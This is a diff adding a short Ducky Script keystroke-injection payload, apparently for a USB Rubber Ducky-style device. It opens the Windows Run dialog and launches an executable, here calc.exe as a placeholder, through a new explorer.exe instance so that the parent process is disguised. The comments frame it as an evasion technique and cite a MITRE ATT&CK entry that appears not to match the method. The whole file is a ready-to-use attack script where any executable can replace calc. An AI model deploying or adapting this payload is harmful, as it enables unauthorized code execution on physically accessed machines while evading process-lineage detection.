@@ -1,0 +1,7 @@
+REM By Joshua O' Brien
+REM Execute specified .exe with the parent process spawning from a new instance of explorer.exe, more here https://attack.mitre.org/techniques/T1564/004/
+REM doesnt use any other ps.1
+GUI r
+DEFAULT_DELAY 300
+STRING explorer.exe /root, "C:\Windows\System32\calc.exe"
+ENTER
